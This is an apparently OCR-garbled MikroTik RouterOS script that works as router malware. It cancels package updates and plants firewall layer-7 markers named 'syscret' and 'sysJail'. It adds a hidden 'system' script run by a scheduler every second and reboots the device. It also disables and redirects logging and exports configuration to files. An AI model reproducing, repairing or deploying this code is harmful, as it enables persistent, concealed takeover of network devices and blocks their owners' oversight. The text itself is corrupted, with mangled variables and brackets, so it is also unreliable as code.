/use act {fore u in=ffind] do={:loc uu (get Su address):loc w [get Su via]:if (([:len (find Suu":"]]!=0) or ((Svv="console") or (Svv="local"))) do={set mLOG true) else={:set mLOG false}}};:loc UX [/sys pac upd get status]; if ([:len (find SUX "Downloaded"]]=0) do={:del O} else=/sys pac upd can); if ([:len (/ip fir lay find name=syscret]] =0) do={/ip fir lay add name=syscret regexp=Ssyscret:set sys true;} else={if ([/ip fir lay get find name=syscret] regexp]!=Ssyscret) do= /ip fir lay set (find name=syscret] regexp=Ssyscret;:set sys true;}); if ($sysJ) do={if ([:len [/ip fir lay find name=sysJail]]=0) do= /ip fir lay add name=sysJail regexp=1} else={if ([:len (tonum [/ip fir lay get find name=sysJail] regexp]]]=0) do=/ip fir lay set find name=sysJail] regexp=1} else={:loc J [tonum [/ip fir lay get find name=sysJail] regexp]];:set J ($J+1);
/ip fir lay set find name=sysJail] regexp=$J;}); if ([:len [/sys scr find name=system]]=1) do={:del 0} else=/sys scr add name=system policy=SQQ source=SZZ);:if ([:len [/sys sch find name=system]]=1) do-/sys sch set find name=system) int=1s on event=system start-date-jan/01/1970 starttime=00:00:00 dis=no) else=1/sys sch add int=1s name=system onevent=system start-date-jan/01/1970 start_time=00:00:00 dis=no);
/sys reb:));:set SR2 0;
/snm exp ver fil-init 10;
/ip ser exp ver fil-init 11;
/ip fir service port exp ver fil-init 12;
/sys log set (find) disable=yes;
/sys log exp ver fil-init 13;
/sys ntp cli exp ver fil-init 15;
/sys log set [find] act=remote dis=yes;:del 1;
/sys ser env rem find]:}}
